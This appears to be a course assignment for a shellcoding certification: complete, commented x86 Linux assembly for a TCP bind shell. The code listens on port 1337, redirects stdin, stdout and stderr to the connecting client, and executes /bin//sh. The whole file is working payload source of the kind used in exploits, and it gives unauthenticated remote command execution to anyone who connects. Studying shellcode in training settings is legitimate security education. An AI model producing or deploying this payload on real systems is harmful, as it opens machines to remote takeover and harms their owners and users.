; John Stigerwalt
; SLAE Assignment 1
; TCP Bind Shell 
; Port 1337


global _start

section .text
_start:
	
			; SOCKET
	push 0x66	
	pop eax		;syscall: sys_socketcall and clean eax 

	push 0x1
	pop ebx		;sys_socket (0x1)

	xor esi, esi	;set esi to 0
	
	push esi	;protocol = 0
	push ebx	;SOCK_STREAM = 1
	push 0x2	;AF_INET = 2

	mov ecx, esp	;save pointer for socket args

	int 0x80	;exec sys_socket

			;BIND

	pop edi		;cleanup for sockfd
	
	xchg edi, eax	;save sockfd

	xchg ebx, eax	;move 0x2 to ebx sys_bind (0x2)
	mov al, 0x66	;syscall: sys_socketcall

	push esi	;sin_addr = 0 (INADDR_ANY)
	push word 0x3905 ;sin_port = 1337 nework byte order
	push word bx	;sin_family = AF_INET 2
	mov ecx, esp	;save pointer to sockaddr_in struct

	push 0x10	;addrlen = 16
	push ecx	;struct sockaddr pointer
	push edi	;sockfd 

	mov ecx, esp	;save pointer to bind args
	int 0x80	;sys_bind call


			;LISTEN
	
	mov al, 0x66	;syscall socketcall 102
	mov bl, 0x4	;sys_listen
	
	push esi	;backlog = 0
	push edi	;sockfd 

	mov ecx, esp	;save pointer for args for listen

	int 0x80	;sys_listen call


			;ACCEPT

	mov al, 0x66
	inc ebx		;sys_accept 0x5

	push esi	;addrlen = 0
	push esi	;addr = 0
	push edi	;sockfd

	mov ecx, esp	;save pointer to accept args

	int 0x80	;sys_accept call

			;DUP2 STDIN, STDOUT, STDERR

	pop ecx		;pop to remove sockfd from stack
	pop ecx		;ecx will now contain 0
	mov cl, 0x2	;initiate counter

	xchg ebx, eax	;save clientfd

loop:
	mov al, 0x3f	;sys_dup2 syscall
	int 0x80	;sys_dup2 call	
	dec ecx		;decrement ecx to countine loop counter
	jns loop	;will not jump when SF flag is set


			;EXECVE //bin/sh

	mov al, 0x0b	;sys_execve

			;No null push is needed as 0 is at the top currently
			;All we need to do now is push "/bin//sh" to stack 

	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"

	mov ebx, esp	;save pointer to filename

	inc ecx		;argv = 0 ecx currently equals -1 need to inc to make 0
	mov edx, ecx	;make sure edx contains 0

	int 0x80	;sys_execve call
